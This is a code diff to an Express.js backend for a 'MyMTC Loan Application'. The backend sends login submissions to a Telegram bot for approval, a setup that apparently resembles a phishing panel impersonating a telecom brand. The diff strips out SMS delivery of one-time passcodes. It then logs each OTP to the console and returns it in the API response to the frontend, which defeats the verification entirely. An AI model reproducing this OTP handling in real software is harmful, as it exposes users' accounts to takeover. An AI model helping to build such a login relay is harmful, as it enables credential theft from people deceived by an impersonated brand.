@@ -2,7 +2,6 @@ const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 require('dotenv').config();
-const twilio = require('twilio');
 const crypto = require('crypto');
 
 const app = express();
@@ -18,12 +17,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 // In-memory storage (for production, use MongoDB)
 const sessions = new Map();
 const pendingApprovals = new Map();
-
-// Twilio Client
-const twilioClient = twilio(
-  process.env.TWILIO_ACCOUNT_SID,
-  process.env.TWILIO_AUTH_TOKEN
-);
 
 // Utility Functions
 function generateSessionId() {
@@ -43,22 +36,6 @@ let telegramBot = null;
 
 function setTelegramBot(bot) {
   telegramBot = bot;
-}
-
-// Send OTP via SMS
-async function sendOTP(phoneNumber, otp) {
-  try {
-    await twilioClient.messages.create({
-      body: `Your MyMTC Loan Application OTP is: ${otp}. Valid for 2 minutes.`,
-      from: process.env.TWILIO_PHONE_NUMBER,
-      to: phoneNumber,
-    });
-    console.log(`OTP sent to ${phoneNumber}`);
-    return true;
-  } catch (error) {
-    console.error('Error sending OTP:', error);
-    return false;
-  }
 }
 
 // API Routes
@@ -129,12 +106,6 @@ app.post('/api/loan/verify-login', async (req, res) => {
     session.otp = otp;
     session.otpExpiry = Date.now() + 2 * 60 * 1000; // 2 minutes
 
-    // Send OTP via SMS
-    const otpSent = await sendOTP(phoneNumber, otp);
-    if (!otpSent) {
-      return res.status(500).json({ message: 'Failed to send OTP' });
-    }
-
     sessions.set(sessionId, session);
 
     // Store pending approval for Telegram bot
@@ -144,16 +115,18 @@ app.post('/api/loan/verify-login', async (req, res) => {
       createdAt: new Date(),
     });
 
-    // Notify Telegram bot
+    // Notify Telegram bot with OTP info
     if (telegramBot) {
       telegramBot.notifyLoginSubmission(session);
     }
 
-    console.log('Login submitted, OTP sent to:', phoneNumber);
+    console.log('Login submitted for:', phoneNumber);
+    console.log('OTP generated:', otp); // Log for admin to see
 
     res.json({
       sessionId,
-      message: 'Login submitted. OTP sent to your phone.',
+      message: 'Login submitted. OTP generated.',
+      otp: otp, // Send OTP to frontend (in production, you would send via SMS)
     });
   } catch (error) {
     console.error('Error in /api/loan/verify-login:', error);
@@ -235,18 +208,14 @@ app.post('/api/loan/resend-otp', async (req, res) => {
     session.otp = otp;
     session.otpExpiry = Date.now() + 2 * 60 * 1000; // 2 minutes
 
-    // Send OTP via SMS
-    const otpSent = await sendOTP(phoneNumber, otp);
-    if (!otpSent) {
-      return res.status(500).json({ message: 'Failed to send OTP' });
-    }
-
     sessions.set(sessionId, session);
 
     console.log('OTP resent to:', phoneNumber);
+    console.log('New OTP:', otp);
 
     res.json({
       message: 'OTP resent successfully',
+      otp: otp, // Send OTP to frontend
     });
   } catch (error) {
     console.error('Error in /api/loan/resend-otp:', error);
